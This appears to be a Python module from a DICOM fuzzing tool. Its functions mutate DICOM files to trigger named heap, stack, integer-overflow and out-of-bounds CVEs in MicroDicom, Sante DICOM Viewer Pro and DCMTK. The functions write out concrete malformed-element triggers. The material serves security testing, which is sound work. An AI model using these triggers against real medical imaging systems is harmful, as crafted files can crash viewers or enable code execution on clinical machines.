"""CVE Memory Corruption Mutations.

Mutations targeting heap overflow, stack overflow, integer overflow,
and out-of-bounds read/write vulnerabilities in DICOM parsers.

Covered CVEs:
- CVE-2025-5943: MicroDicom heap buffer overflow
- CVE-2025-35975: MicroDicom out-of-bounds write
- CVE-2024-22100: MicroDicom heap-based buffer overflow
- CVE-2024-25578: MicroDicom out-of-bounds write
- CVE-2024-28877: MicroDicom stack-based buffer overflow
- CVE-2024-1453: Sante DICOM Viewer Pro out-of-bounds read
- CVE-2025-5307: Sante DICOM Viewer Pro out-of-bounds read
- CVE-2024-47796: DCMTK out-of-bounds write (nowindow LUT)
- CVE-2024-52333: DCMTK out-of-bounds write (determineMinMax)
"""

from __future__ import annotations

import random
import struct


def mutate_heap_overflow_pixel_data(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-5943 heap overflow.

    The vulnerability occurs when:
    1. Rows/Columns values are very large
    2. BitsAllocated creates large allocation
    3. PixelData is smaller than expected allocation

    Returns mutated DICOM bytes.
    """
    result = bytearray(data)

    # Find Rows tag (0028,0010) and set to large value
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set rows to 0xFFFF (65535)
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Find Columns tag (0028,0011) and set to large value
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set columns to 0xFFFF
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Find BitsAllocated (0028,0100) and set to 16
    bits_tag = b"\x28\x00\x00\x01"
    idx = data.find(bits_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 16)

    return bytes(result)


def mutate_integer_overflow_dimensions(data: bytes) -> bytes:
    """Create mutation targeting integer overflow in dimension calculation.

    When Rows * Columns * BitsAllocated/8 overflows, allocation is too small.
    """
    result = bytearray(data)

    # Values that cause overflow when multiplied
    overflow_values = [
        (0x8000, 0x8000),  # 32768 * 32768 overflows 32-bit
        (0xFFFF, 0xFFFF),  # 65535 * 65535 overflows 32-bit
        (0x10000, 0x10000),  # If 32-bit, this overflows
    ]

    rows, cols = random.choice(overflow_values)

    # Find and modify Rows
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", rows & 0xFFFF)

    # Find and modify Columns
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", cols & 0xFFFF)

    return bytes(result)


def mutate_oob_write_pixel_data(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-35975 out-of-bounds write.

    MicroDicom DICOM Viewer vulnerability:
    - Out-of-bounds write due to insufficient validation of user-supplied data
    - Exploitable via malicious DCM file
    - Can allow arbitrary code execution

    Attack vector: Malformed pixel data with specific dimension/size mismatches.
    """
    result = bytearray(data)

    # Target specific dimension combinations that trigger OOB write
    # The vulnerability occurs when calculated buffer size differs from actual
    oob_triggers = [
        # (rows, cols, bits_allocated) - combinations that cause OOB
        (1, 0xFFFE, 16),  # Near-max columns with minimal rows
        (0xFFFE, 1, 16),  # Near-max rows with minimal columns
        (256, 256, 32),  # Large bits allocated
        (512, 512, 24),  # 24-bit (unusual) allocation
    ]

    rows, cols, bits = random.choice(oob_triggers)

    # Modify Rows (0028,0010)
    rows_tag = b"\x28\x00\x10\x00"
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", rows)

    # Modify Columns (0028,0011)
    cols_tag = b"\x28\x00\x11\x00"
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", cols)

    # Modify BitsAllocated (0028,0100)
    bits_tag = b"\x28\x00\x00\x01"
    idx = data.find(bits_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", bits)

    # Add undersized PixelData to trigger the write beyond bounds
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    idx = data.find(pixel_data_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set a small PixelData length that doesn't match dimensions
        if idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 64)  # Only 64 bytes

    return bytes(result)


def mutate_oob_write_lack_validation(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-25578 out-of-bounds write.

    MicroDicom vulnerability due to lack of proper validation:
    - Memory corruption within the application
    - Triggered by malformed DCM file

    Attack vector: Malformed element lengths and value representations.
    """
    result = bytearray(data)

    # Find explicit VR elements and corrupt their lengths
    explicit_vrs = [b"OB", b"OW", b"OF", b"OD", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    mutations_applied = 0
    for vr in explicit_vrs:
        idx = 0
        while mutations_applied < 3:  # Limit mutations per file
            idx = result.find(vr, idx)
            if idx == -1:
                break

            # Check if this looks like a valid VR position (after 4-byte tag)
            if idx >= 4 and idx + 8 < len(result):
                # For OB/OW/OF/OD/SQ/UN/UC/UR/UT, length is at offset +4 (4 bytes)
                length_offset = idx + 4
                if length_offset + 4 < len(result):
                    # Set length to a value that causes OOB write
                    if random.random() < 0.5:
                        # Length pointing past end of file
                        result[length_offset : length_offset + 4] = struct.pack(
                            "<I", len(result) * 2
                        )
                        mutations_applied += 1

            idx += 1

    return bytes(result)


def mutate_heap_overflow_dcm_parsing(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-22100 heap buffer overflow.

    MicroDicom heap-based buffer overflow:
    - Exploitable by opening malicious DCM file
    - Allows remote code execution
    - Low complexity attack

    Attack vector: Specific combinations of DICOM elements that overflow heap.
    """
    result = bytearray(data)

    # Target Private Creator elements which are often parsed into fixed buffers
    private_creator_tag = b"\x09\x00\x10\x00"  # (0009,0010) Private Creator
    idx = data.find(private_creator_tag)

    if idx == -1:
        # Inject a private creator with overflow payload
        # Insert after file meta header (after first 132 bytes typically)
        insert_pos = min(200, len(result) - 4)

        # Create oversized private creator element
        overflow_payload = (
            private_creator_tag
            + b"LO"  # VR
            + struct.pack("<H", 0xFFFF)  # Max length
            + b"A" * 256  # Overflow data
        )
        result = result[:insert_pos] + overflow_payload + result[insert_pos:]
    else:
        # Modify existing private creator length
        if idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    # Also target SOP Instance UID for additional overflow vector
    sop_uid_tag = b"\x08\x00\x18\x00"  # (0008,0018)
    idx = data.find(sop_uid_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set oversized length
        result[idx + 6 : idx + 8] = struct.pack("<H", 512)

    return bytes(result)


def mutate_stack_overflow_dcm(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-28877 stack buffer overflow.

    MicroDicom stack-based buffer overflow:
    - User interaction required (open malicious file)
    - Allows arbitrary code execution
    - Affects version 2023.3 and prior

    Attack vector: Deeply nested structures or oversized string elements.
    """
    result = bytearray(data)

    # Stack overflows often triggered by:
    # 1. Recursive parsing of deeply nested sequences
    # 2. Large string values copied to stack buffers

    # Create deeply nested sequence that may overflow stack
    nesting_depth = random.randint(200, 1000)

    item_start = b"\xfe\xff\x00\xe0"  # Item
    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
    sq_start = b"\x08\x00\x15\x11"  # Referenced Series Sequence

    # Build recursive sequence structure
    nested = b""
    for _ in range(nesting_depth):
        nested = (
            sq_start
            + b"SQ\x00\x00"
            + b"\xff\xff\xff\xff"  # Undefined length
            + item_start
            + b"\xff\xff\xff\xff"
            + nested
            + item_end
            + b"\x00\x00\x00\x00"
            + b"\xfe\xff\xdd\xe0"  # Sequence delimitation
            + b"\x00\x00\x00\x00"
        )

    # Also inject oversized Patient Name (stack buffer target)
    patient_name_tag = b"\x10\x00\x10\x00"  # (0010,0010)
    idx = data.find(patient_name_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set length to trigger stack copy overflow
        result[idx + 6 : idx + 8] = struct.pack("<H", 4096)
        # Pad with overflow data
        overflow_data = b"A" * 4096
        result = result[: idx + 8] + overflow_data + result[idx + 8 :]

    # Append nested structure
    result = result[:-4] + nested + result[-4:]

    return bytes(result)


def mutate_oob_read_sante_2024(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-1453 out-of-bounds read.

    Sante DICOM Viewer Pro vulnerability:
    - Out-of-bounds read via malicious DICOM file
    - Can disclose information or execute arbitrary code
    - Affects version 14.0.3 and prior

    Attack vector: Malformed elements with lengths exceeding bounds.
    """
    result = bytearray(data)

    # OOB read triggered by:
    # 1. Element lengths larger than actual data
    # 2. String elements with missing null terminators
    # 3. Numeric elements with oversized values

    # Target commonly parsed elements that may cause OOB read
    oob_targets = [
        (b"\x08\x00\x60\x00", b"SH", 256),  # (0008,0060) Modality
        (b"\x08\x00\x70\x00", b"LO", 512),  # (0008,0070) Manufacturer
        (b"\x10\x00\x10\x00", b"PN", 1024),  # (0010,0010) Patient Name
        (b"\x10\x00\x20\x00", b"LO", 512),  # (0010,0020) Patient ID
        (b"\x20\x00\x0d\x00", b"UI", 256),  # (0020,000D) Study Instance UID
    ]

    tag, vr, length = random.choice(oob_targets)
    idx = data.find(tag)

    if idx != -1 and idx + 8 < len(result):
        # Set length larger than remaining file
        remaining = len(result) - idx - 8
        oversized_length = remaining + random.randint(100, 1000)
        result[idx + 6 : idx + 8] = struct.pack("<H", min(oversized_length, 0xFFFF))
    else:
        # Inject element with oversized length
        insert_pos = min(200, len(result) - 4)
        oversized_element = (
            tag
            + vr
            + struct.pack("<H", length)  # Claim large length
            + b"X" * min(length // 4, 64)  # But provide less data
        )
        result = result[:insert_pos] + oversized_element + result[insert_pos:]

    return bytes(result)


def mutate_oob_read_sante_2025(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-5307 out-of-bounds read.

    Sante DICOM Viewer Pro vulnerability:
    - Out-of-bounds read in version 14.2.1 and prior
    - Can disclose sensitive information
    - Potentially allows arbitrary code execution

    Attack vector: Malformed pixel data dimensions with undersized buffers.
    """
    result = bytearray(data)

    # This CVE is related to pixel data parsing with dimension mismatches
    # Similar to other OOB reads but with specific trigger patterns

    # Set up dimension/buffer size mismatch
    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
    bits_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated

    # Set dimensions that will cause read beyond allocated buffer
    oob_dimensions = [
        (4096, 4096, 3, 16),  # Large RGB 16-bit
        (8192, 1, 1, 16),  # Very wide single row
        (1, 8192, 1, 16),  # Very tall single column
        (2048, 2048, 4, 8),  # RGBA 8-bit
    ]

    rows, cols, samples, bits = random.choice(oob_dimensions)

    # Modify dimensions if tags exist
    for tag, value in [
        (rows_tag, rows),
        (cols_tag, cols),
        (samples_tag, samples),
        (bits_tag, bits),
    ]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", value)

    # Set PixelData to small size to trigger OOB read
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    idx = data.find(pixel_data_tag)
    if idx != -1 and idx + 12 < len(result):
        # Set very small pixel data length
        result[idx + 8 : idx + 12] = struct.pack("<I", 64)

    return bytes(result)


def mutate_dcmtk_nowindow_oob_write(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-47796 out-of-bounds write.

    DCMTK vulnerability in nowindow functionality:
    - Improper array index validation in LUT (look-up table) processing
    - OOB write when pixel count stored doesn't match expected count
    - Affects dcmimgle library rendering invalid monochrome DICOM images

    Attack vector: Mismatched pixel counts with LUT pointer manipulation.
    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2122
    """
    result = bytearray(data)

    # The vulnerability occurs in nowindow LUT processing when:
    # 1. NumberOfFrames * Rows * Columns doesn't match actual pixel data
    # 2. LUT array indices are not properly validated

    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
    frames_tag = b"\x28\x00\x08\x00"  # (0028,0008) Number of Frames
    high_bit_tag = b"\x28\x00\x02\x01"  # (0028,0102) High Bit
    bits_stored_tag = b"\x28\x00\x01\x01"  # (0028,0101) Bits Stored

    # Trigger patterns that cause LUT index overflow
    # These create mismatches between declared dimensions and actual data
    lut_overflow_patterns = [
        # (rows, cols, frames, high_bit, bits_stored)
        (0xFFFF, 1, 1, 15, 16),  # Max rows with minimal data
        (1, 0xFFFF, 1, 15, 16),  # Max columns with minimal data
        (256, 256, 0xFF, 15, 16),  # Many frames
        (512, 512, 1, 31, 32),  # 32-bit with large dimensions
        (1024, 1024, 1, 11, 12),  # 12-bit unusual configuration
    ]

    rows, cols, frames, high_bit, bits_stored = random.choice(lut_overflow_patterns)

    # Modify dimension tags if they exist
    for tag, value in [
        (rows_tag, rows),
        (cols_tag, cols),
        (high_bit_tag, high_bit),
        (bits_stored_tag, bits_stored),
    ]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", value)

    # Handle Number of Frames (IS VR - integer string)
    frames_idx = data.find(frames_tag)
    if frames_idx != -1 and frames_idx + 8 < len(result):
        # Replace with string representation
        frames_str = str(frames).encode()
        # Pad to even length
        if len(frames_str) % 2:
            frames_str += b" "
        result[frames_idx + 6 : frames_idx + 8] = struct.pack("<H", len(frames_str))
        # Insert frames value (may corrupt following data - intentional for fuzzing)
    else:
        # Inject Number of Frames element
        insert_pos = min(300, len(result) - 4)
        frames_str = str(frames).encode()
        if len(frames_str) % 2:
            frames_str += b" "
        frames_element = (
            frames_tag + b"IS" + struct.pack("<H", len(frames_str)) + frames_str
        )
        result = result[:insert_pos] + frames_element + result[insert_pos:]

    # Set PixelData to size that doesn't match calculated dimensions
    # This triggers the LUT index overflow
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    idx = data.find(pixel_data_tag)
    if idx != -1 and idx + 12 < len(result):
        # Set to small size that doesn't match rows*cols*frames*bytes_per_pixel
        result[idx + 8 : idx + 12] = struct.pack("<I", 128)

    return bytes(result)


def mutate_dcmtk_determine_minmax_oob(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-52333 out-of-bounds write.

    DCMTK vulnerability in determineMinMax functionality:
    - Improper array index validation in DiInputPixelTemplate
    - OOB write when processing pixel data with mismatched dimensions
    - Heap buffer overflow in dcmimgle/diinpxt.h

    Attack vector: Pixel data dimensions that cause array bounds violation.
    Reference: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2121
    """
    result = bytearray(data)

    # The vulnerability is in DiInputPixelTemplate::determineMinMax()
    # It occurs when pixel array bounds are not validated during min/max calculation
    # The issue manifests when actual pixel count differs from expected

    rows_tag = b"\x28\x00\x10\x00"  # (0028,0010) Rows
    cols_tag = b"\x28\x00\x11\x00"  # (0028,0011) Columns
    samples_tag = b"\x28\x00\x02\x00"  # (0028,0002) Samples per Pixel
    bits_alloc_tag = b"\x28\x00\x00\x01"  # (0028,0100) Bits Allocated
    planar_tag = b"\x28\x00\x06\x00"  # (0028,0006) Planar Configuration

    # Trigger patterns for determineMinMax overflow
    # These cause the min/max loop to read/write beyond buffer
    minmax_overflow_patterns = [
        # (rows, cols, samples, bits_allocated, planar_config)
        (0xFFFE, 2, 1, 16, 0),  # Near-max rows, triggers unsigned overflow
        (2, 0xFFFE, 1, 16, 0),  # Near-max columns
        (1000, 1000, 3, 8, 1),  # RGB planar with large dims
        (2048, 2048, 1, 8, 0),  # Large monochrome 8-bit
        (256, 256, 4, 16, 0),  # RGBA 16-bit
    ]

    rows, cols, samples, bits, planar = random.choice(minmax_overflow_patterns)

    # Modify tags if they exist
    for tag, value in [
        (rows_tag, rows),
        (cols_tag, cols),
        (samples_tag, samples),
        (bits_alloc_tag, bits),
        (planar_tag, planar),
    ]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", value)

    # Key to triggering: PixelData size much smaller than expected
    # Expected size: rows * cols * samples * (bits/8)
    # Actual size: small value that causes OOB when iterating
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    idx = data.find(pixel_data_tag)
    if idx != -1 and idx + 12 < len(result):
        # Set to intentionally small size
        result[idx + 8 : idx + 12] = struct.pack("<I", 64)
    else:
        # Inject minimal PixelData
        pixel_element = (
            pixel_data_tag
            + b"OW"
            + b"\x00\x00"  # Reserved
            + struct.pack("<I", 64)  # Small length
            + b"\x00" * 64  # Minimal data
        )
        result = result[:-4] + pixel_element + result[-4:]

    return bytes(result)
